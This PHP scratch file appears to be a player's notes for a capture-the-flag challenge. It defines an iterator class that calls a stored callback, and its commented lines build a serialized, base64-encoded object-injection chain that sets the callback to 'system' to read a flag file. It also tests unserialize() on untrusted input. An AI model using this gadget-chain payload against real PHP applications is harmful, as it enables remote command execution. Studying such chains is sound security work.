<?php

namespace Helpers{
    use \ArrayIterator;
	class ArrayHelpers extends ArrayIterator
	{
		public $callback;

		public function current()
		{
			$value = parent::current();
			$debug = call_user_func($this->callback, $value);
			return $value;
		}
	}
}
    // echo base64_encode(serialize(new ArrayHelpers()));
    // echo (base64_encode(('O:5:"Pizza":3:{s:5:"price";N;s:6:"cheese";N;s:4:"size";O:9:"Spaghetti":3:{s:5:"sauce";O:8:"IceCream":2:{s:7:"flavors";O:21:"\Helpers\ArrayHelpers":4:{i:0;i:0;i:1;a:1:{i:0;s:26:"cat /pBhfMBQlu9uT_flag.txt";}i:2;a:1:{s:8:"callback";s:6:"system";}i:3;N;}s:7:"topping";N;}s:7:"noodles";N;s:7:"portion";N;}}}')));
    // echo var_dump(unserialize('O:20:"Helpers\ArrayHelpers":4:{i:0;i:0;i:1;a:0:{}i:2;a:1:{s:8:"callback";O:5:"Pizza":3:{s:5:"price";N;s:6:"cheese";N;s:4:"size";N;}}i:3;N;}'));
    // echo "\n";
    // $b = Array("a","b","c");
    // foreach($b as $char){
    //     echo "1+1=3";
    // }
    // $c = ('O:12:"Helpers\ArrayHelpers":1:{s:8:"callback";N;}');
    // echo $c;
    // var_dump(unserialize($c));


// require_once 'challenge/Helpers/ArrayHelpers.php';
// use challenge\Helpers\ArrayHelpers;

// class Spaghetti
// {
//     public $sauce;
//     public $noodles;
//     public $portion;

//     public function __get($tomato)
//     {
//         // ($this->sauce)();
//         echo "\nTriggered\n";
//     }
// }
//     $c = ('O:9:"Spaghetti":2:{s:5:"abcd3";N;s:7:"abcdefg";N;}');
//     echo $c;
//     var_dump(unserialize($c));
//     echo "\n";

//     $f = 'O:1:"a":3:{O:9:"Spaghetti":3:{s:5:"sauce";N;s:7:"noodles";N;s:7:"portion";N;};O:9:"Spaghetti":3:{s:5:"sauce";N;s:7:"noodles";N;s:7:"portion";N;};O:9:"Spaghetti":3:{s:5:"sauce";N;s:7:"noodles";N;s:7:"portion";N;}}';
    
//     $g = base64_encode($f);
    // echo $g;

    // echo var_dump(unserialize($f));
    // $db = new Database();
    // $order = unserialize($f);

    // $foodName = get_class($order);

    // $result = $db->Order($id,$foodName);
    // if ($result) {
    //     header("Location: index.php");
    //     die();
    // } else {
    //     $errorInfo = $stmt->errorInfo();
    //     die("Error executing query: " . $errorInfo[2]);
    // }
